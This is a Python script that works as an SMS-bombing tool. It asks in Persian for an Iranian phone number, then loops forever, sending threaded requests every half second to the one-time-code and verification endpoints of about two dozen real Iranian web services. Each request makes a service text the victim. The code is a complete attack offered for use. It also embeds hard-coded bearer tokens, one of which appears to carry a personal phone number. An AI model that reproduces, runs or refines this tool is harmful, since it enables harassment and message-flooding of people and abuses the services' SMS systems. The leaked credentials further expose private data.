import requests
import json
import time
from threading import Thread

def send_request(api_config, phone_number):
    url = api_config["url"]
    headers = api_config.get("headers", {})
    data = api_config.get("data", {})
    method = api_config.get("method", "POST")
    params = api_config.get("params", {})
    
    # Replace phone number in data, headers, params and URL
    replacements = {
        "PHONE_NUMBER": phone_number,
        "PHONE_NUMBER_NO_ZERO": phone_number[1:],  # Remove first zero
        "PHONE_NUMBER_INTERNATIONAL": f"+98{phone_number[1:]}"  # +98 format
    }
    
    def replace_values(obj):
        if isinstance(obj, dict):
            return {k: replace_values(v) for k, v in obj.items()}
        elif isinstance(obj, str):
            for key, value in replacements.items():
                obj = obj.replace(key, value)
            return obj
        elif isinstance(obj, list):
            return [replace_values(item) for item in obj]
        return obj
    
    # Apply replacements
    url = replace_values(url)
    headers = replace_values(headers)
    data = replace_values(data)
    params = replace_values(params)
    
    try:
        if method.upper() == "POST":
            if isinstance(data, dict):
                response = requests.post(url, json=data, headers=headers, params=params)
            else:
                response = requests.post(url, data=data, headers=headers, params=params)
        elif method.upper() == "GET":
            response = requests.get(url, headers=headers, params=params)
        else:
            print(f"Unsupported method: {method}")
            return
        
        print(f"API: {url}")
        print(f"Status Code: {response.status_code}")
        print(f"Response: {response.text[:200]}...")  # Show first 200 characters
        print("-" * 80)
        
    except Exception as e:
        print(f"Error calling {url}: {str(e)}")
        print("-" * 80)

# API configurations
api_configs = [
    {
        "url": "https://api.digikala.com/v1/user/authenticate/",
        "headers": {
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_7_10 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1"
        },
        "data": {"backUrl": "/profile/", "username": "PHONE_NUMBER", "otp_call": False, "hash": None}
    },
    {
        "url": "https://apigateway.okala.com/api/voyager/C/CustomerAccount/OTPRegister",
        "headers": {
            "Content-Type": "application/json"
        },
        "data": {"mobile": "PHONE_NUMBER", "confirmTerms": True, "notRobot": False, "ValidationCodeCreateReason": 5, "OtpApp": 0, "deviceTypeCode": 7, "IsAppOnly": False}
    },
    {
        "url": "https://api.pindo.ir/v1/user/login-register/",
        "headers": {
            "Content-Type": "application/json",
            "X-Requested-With": "XMLHttpRequest"
        },
        "data": {"phone": "PHONE_NUMBER"}
    },
    {
        "url": "https://core.otaghak.com/odata/Otaghak/Users/SendVerificationCode",
        "headers": {
            "Content-Type": "application/json; charset=UTF-8"
        },
        "data": {"username": "PHONE_NUMBER", "isShortOtp": True}
    },
    {
        "url": "https://cyclops.drnext.ir/v1/patients/auth/send-verification-token",
        "headers": {
            "Content-Type": "application/json",
            "Accept-Language": "fa"
        },
        "data": {"source": "besina", "mobile": "PHONE_NUMBER", "key": "U2FsdGVkX1+freTV85bssxEhuoBrL9XHV5fgEtrYQP0oJsxLebC4iR5k7Ucx7tushtONIuEupqg1zklqDJwcZQ=="}
    },
    {
        "url": "https://api.snapp.market/mart/v1/user/loginMobileWithNoPass",
        "method": "GET",
        "params": {"cellphone": "PHONE_NUMBER", "platform": "PWA"},
        "headers": {
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_7_10 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1"
        }
    },
    {
        "url": "https://api.snapp.doctor/core/Api/Common/v1/sendVerificationCode/PHONE_NUMBER/sms",
        "method": "GET",
        "params": {"cCode": "+98"},
        "headers": {
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_7_10 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
            "Accept-Language": "fa"
        }
    },
    {
        "url": "https://okcs.com/users/mobilelogin",
        "headers": {
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_7_10 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1"
        },
        "data": "mobile=PHONE_NUMBER&url=https%3A%2F%2Fokcs.com%2F"
    },
    {
        "url": "https://app.snapp.taxi/api/api-passenger-oauth/v3/mutotp",
        "headers": {
            "Content-Type": "application/json",
            "Accept-Language": "fa-IR"
        },
        "data": {"cellphone": "+98PHONE_NUMBER_NO_ZERO", "attestation": {"method": "skip", "platform": "skip"}, "extra_methods": []}
    },
    {
        "url": "https://petabad.com/api/customer/member/register/",
        "headers": {
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"
        },
        "data": "email=PHONE_NUMBER&accept_term=on"
    },
    {
        "url": "https://api.divar.ir/v5/auth/authenticate",
        "headers": {
            "Content-Type": "application/json"
        },
        "data": {"phone": "PHONE_NUMBER"}
    },
    {
        "url": "https://gharar.ir/users/phone_number/",
        "headers": {
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"
        },
        "data": "phone=PHONE_NUMBER"
    },
    {
        "url": "https://izadinjpharmacy.ir/users/login-register/",
        "method": "GET",
        "headers": {
            "Accept": "application/json, text/javascript, */*; q=0.01",
            "Accept-Language": "IR",
            "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_7_10 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1"
        }
    },
    {
        "url": "https://api.komodaa.com/api/v2.6/loginRC/request",
        "headers": {
            "Content-Type": "application/json",
            "User-Agent": "komodaa/7.0.1.301 Mozilla/5.0 (iPhone; CPU iPhone OS 16_7_10 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1"
        },
        "data": {"phone_number": "PHONE_NUMBER"}
    },
    {
        "url": "https://www.vitrin.shop/api/v1/user/request_code",
        "headers": {
            "Content-Type": "application/json"
        },
        "data": {"phone_number": "PHONE_NUMBER", "forgot_password": False}
    },
    {
        "url": "https://api.iapps.ir/accounts/otp/generate",
        "headers": {
            "Content-Type": "application/json;charset=utf-8",
            "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_7_10 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1"
        },
        "data": {"phoneNumber": "+98PHONE_NUMBER_NO_ZERO"}
    },
    {
        "url": "https://uiapi2.saapa.ir/api/otp/sendCode",
        "headers": {
            "Content-Type": "application/json; charset=utf-8"
        },
        "data": {"mobile": "PHONE_NUMBER", "from_meter_buy": False}
    },
    {
        "url": "https://api.azkivam.com/auth/login",
        "headers": {
            "Content-Type": "application/json"
        },
        "data": {"mobileNumber": "PHONE_NUMBER"}
    },
    # New APIs added
    {
        "url": "https://api.torob.com/v4/user/phone/send-pin/",
        "method": "GET",
        "params": {
            "phone_number": "PHONE_NUMBER",
            "_http_referrer": "https%3A%2F%2Fwww.google.com%2F",
            "source": "next_mobile"
        },
        "headers": {
            "Content-Type": "application/json",
            "Referer": "https://torob.com",
            "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_7_10 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1"
        }
    },
    {
        "url": "https://snappfood.ir/mobile/v4/user/loginMobileWithNoPass",
        "method": "GET",
        "params": {
            "cellphone": "PHONE_NUMBER",
            "lat": "35.774",
            "long": "51.418",
            "optionalClient": "PWA",
            "client": "PWA",
            "deviceType": "PWA",
            "appVersion": "6.0.0",
            "UDID": "a695fa03-8c34-4b76-991d-293d9c4446d3",
            "Bonyan": "true"
        },
        "headers": {
            "Content-Type": "application/json",
            "Authorization": "Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImp0aSI6ImVjMDljZGJiNzMzZWUxNzY0YTk3MmZiMTkyYmJjOTE3NjNmYjFmODA4OTc3NDRjMjM0NTA4YjlhMzhmYTQxNmIwMWQzMWM4NWQyZDVmZjM4In0.eyJhdWQiOiJzbmFwcGZvb2RfcHdhIiwianRpIjoiZWMwOWNkYmI3MzNlZTE3NjRhOTcyZmIxOTJiYmM5MTc2M2ZiMWY4MDg5Nzc0NGMyMzQ1MDhiOWEzOGZhNDE2YjAxZDMxYzg1ZDJkNWZmMzgiLCJpYXQiOjE3NTgyMjE3MzMsIm5iZiI6MTc1ODIyMTczMywiZXhwIjoxNzU4ODI2NjUzLCJzdWIiOiIiLCJzY29wZXMiOlsibW9iaWxlX3YyIiwibW9iaWxlX3YxIiwid2VidmlldyJdfQ.PAmE0JM2lW9HyTNnrQd0sjj3jFIxPKCUscWJ0cCdBy0CECpqMXPo4J-evd8IV_24d-i375CIqLLmKIS10spGG3neIir3i65DcWJnBzoDOZgeUWy2SMUTa-vmtau0YaL0_baVAjz50frnXwgvJpAAKDNiJ_OuWnZGD7ZNF4zC1z9xFZPEZsYqbOL72dE0Kl3JDhviNMl702l3rxkPzYiVA_InSXMuV5T4KL6TFhEh3MW1vqdE9OZuXX8dR3F7HPAyTGfABh5vLWPoF9OpUciZlI_wEBEl-wyFe_swpgVXzwKsF2ottQn3e-Cb7snr8LxMO18_DwVbk1CKpjpypkZwMVaIe1cA-OLSFXei05lSu7-prD2ACW3KuMuY8NiIfabjp860anBK6dfL_7-FIlNUiNNDuIdNCN_ijrdnu5u0WvofKIuTKqTo6dAA7BUhZhXUiPuT6anldOnjIlN7sTwNUiISkKfA9gJCAYlcTAd_uuHd0CalSxGE1Q9_wonwE4SKgKLu0Lo7GiL4O5jtPeGjS9GTcu5kTZqr7vMD1fyuyEzTrpITwAgf6aHr41BWQU4AncnZUsI5koG0jE7S3OCOB61uksH6Z44ztsVcd4LrGgE45QCU0yA_asqsQtZ_9iH1B7Ly_5xwhw8qJpm60LPButn7aa4OrUS8Pjn-7_j-qyR-ejdbtwLrl0chmNtXOe4TXK2GtL0Rr60fM9G0EKYFgcUTlYspjVgCupXz3o2eDhqFtcV4RvQXzMfkh_CNH3zpOrmVtrbSOcngG2xX4dnQvZuLp_vER39utEIF9zB7kxEZW3BD72xonG0L1fO9lsSbblwob_lJiLbrfqOiZ5NHEBfXoIXJJmWwnezHXAhuyr06PHf-iT1mpt20MzNql8vaDTA52XL8amq7qGaobHfSkfd1LOjXpXhEfqu_YilWacP6UBHS765Upqk-M2QHEjVJfmPHHl2ytbNL-XSEdJeav3NFvjZ9Yxm2D_bsU4LkYx8Q5Nl3JXx-pTcdYTQZt4g4dho8sSJ1LOLfYWbo4mrK7tKq7Zce8qeu5zqZsckBlZKYpN5Mg4Sk5z6fdCBfqpak2JGDa0lrY_F81PYJOxG2Ai3Hdw3UkK8YUD5ap3PWoE1to3rCvUEdmk11dIam4XWlBvS-KCZ6hem9Kuk5rJ3pGd1isA2MTa_zRR2S50m84LoWnHqucBy_1j86psEHwNmLNHr9cl-vv8KLRI_NXmZPzwAsAe_AYmIW4tC4YW2kzd65AOQk1yz3DMyUy1ho75-8ZeJj-wO5pOhftC26u2nQYkWSMhsK_fLox0pynRsI-mS2xod2JX_fwE3SpkKuHb_pYO_ZJUPR6N_gMfNgsCg57T17QF0fAgIJBnGi_q9svnvj3emeSlo47KahMTXBRwhrJAAi3koR5NFHANSKBD53gsGaGnLkuoYP02ASB_fDOxXyM_7UmrkzEgedF-CEmT7VijZGPLj8weRY3Jbfv29AWTuzTt-CT3sqCs4Rsk82PXJUu86xZcuQq6EuF0_tVEZ1w6X5yvm1xePM2S1BLube0lMVXiiqfbJvhiivcpDxTBpJ-RSdvw0wUs4slbXt7-NG8CQNtbfxoTnwnoE7nng8P_Xz0hKxUhAiz0AfyOesY_6amCOd6IlANITmNGmxo5x4PDo5IPFwPoaoAb0X2xuSDzlmACn1n20YrV2nQSEBE5LVZB8hNrSj05l2Rz2kbAZfOUj6FXosiSgHYl1bxvkl8a2VRyF805rDO1d6C3WXiQd0q9pyg3ysjLt36226oSIfXNpPkF5PBsSeQrRBgQdFPBizqqDc2kIH6XCZ4E6deEJCL_0dYDi6fk-XOdWVzgGuC58W9XwbSKv-QW2x6bprhQoWdBqQx7yCHCRsmE2fHr8kjuIHQ_Y2g7QeUlgjV0rZVDjLCgfS2CYLrBqn7oZCUjAVZD114rJsI016Y-kboBSWFPEhbDC5v_dWkdgMHb9lN1kz8SHtvPdjE6ob9SYVhHWhQpN6x-WWTCv5rp7_nzP8nIvB7fdDjeR4tShlIYyyVnNER7K61IBga6Gx3OY1Vn9sQH9EolRnFDW7wnwcpXRFwzn1wfqOFwBTbD5z8WERYGNvVwxFgj0f1Viqayva2MEdKvicCqCTjNcr_M9jhJysBdGbyVj5A8Zy4IFpUrq5Mzm-qR_xlNtZdq16Rs7YNEIC30f_-qstTuTwXkEdRpTrhjpbYAcSc3ldtJd1_pCXaiTe6dDmm3M5xQmLsR_O0YM6gTeYdBW4kOJsLhp9M3EUfujwMM49SDaMKF8fn-oIJzIWWl0JSaPXuQxaFlh8jh8w-4BS79eChephX-gsne2G7nOdUIAjuj-ryP1iaaQJ6aOK_nY-o6TZ8anTzhO8H43cgl34BeC81WQzPFmEtzo_XWJwt-GRrw3swfSLwabusfw8z5A82Ajwddp0Vo_Hib0ffsnYM7ArGqNEZXsxuSOmYXtuFKI4Sdj7MbaVJr3h_9YPm3wJMoslep_2ryrhZ1y2JX9crIy7Pd_NwW9jNpyj-9OELFM6z2VdUeNY3oMlrEpahfTkBRKg5H9WO-PzPwnndsBV7NEjbjNjNDBDfaLxOG4QVXmgRoVYSetmQMGYQ1sz27I0Xhk-8dH09b2QwX5820CIQGlYTA-jBXlAs_cSzdbesUnlB2MzBZya3IT3wsLc-H4HQtJu59mZ2yN1uXslZwkFt9RtDFGg0C2-zlY",
            "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_7_10 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1"
        }
    },
    {
        "url": "https://khadamatemajazi.com/wp-admin/admin-ajax.php",
        "headers": {
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_7_10 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1"
        },
        "data": "action=profile_approve_mobile&mobile=PHONE_NUMBER"
    },
    {
        "url": "https://follower.ir/sign",
        "headers": {
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_7_10 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
            "Authorization": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJmdWxsbmFtZSI6Ilx1MDY0NVx1MDY0N1x1MDY0NVx1MDYyN1x1MDY0NiIsIm1vYmlsZSI6IjA5OTM1NjcyNDMxIiwiZGV2aWNlX2lkIjpudWxsLCJ0aW1lIjoxNzU4MzIzNzE2LCJjb2RlIjoiJDJ5JDEwJDZsdXBSdkQ3YnE0bldTSG1nSTNnaGUxcTg3MHdWMWVEbW1NOWhjTkoyaWI1Q0puRmE3TVwvRyJ9.yTa3phynZdJy4-_vf-fIfXmrEei0gd4jFGrIi4TWYlM"
        },
        "data": "mobile=PHONE_NUMBER"
    },
    {
        "url": "https://sandbox.sbm24.net/api/v2/authenticate/send-confirmation-code",
        "method": "GET",
        "params": {
            "mobile": "PHONE_NUMBER",
            "reqtoken": "656e2d5553"
        },
        "headers": {
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_7_10 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1"
        }
    },
    {
        "url": "https://uapi.activecleaners.ir/Auth/VerifyUser/GetVerifycode",
        "headers": {
            "Content-Type": "application/json",
            "Authorization": "Bearer"
        },
        "data": {
            "mobileOrEmail": "PHONE_NUMBER",
            "deviceCode": "ActiveClient[Mozilla/5.0 (iPhone; CPU iPhone OS 16_7_10 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1]",
            "firstName": "",
            "lastName": "",
            "password": ""
        }
    }
]

def main():
    # Get phone number from user
    phone_number = input("لطفاً شماره تلفن را وارد کنید (مثال: 09123456789): ").strip()
    
    if not phone_number.startswith('0') or len(phone_number) != 11:
        print("شماره تلفن معتبر نیست! باید با 0 شروع شود و 11 رقمی باشد.")
        return
    
    print(f"\nشروع ارسال درخواست‌ها برای شماره: {phone_number}")
    print("=" * 80)
    
    # Send requests continuously every 0.5 seconds
    while True:
        for config in api_configs:
            thread = Thread(target=send_request, args=(config, phone_number))
            thread.start()
            time.sleep(0.5)
        
        print("یک دور کامل ارسال شد. ادامه...")
        print("=" * 80)

if __name__ == "__main__":
    main()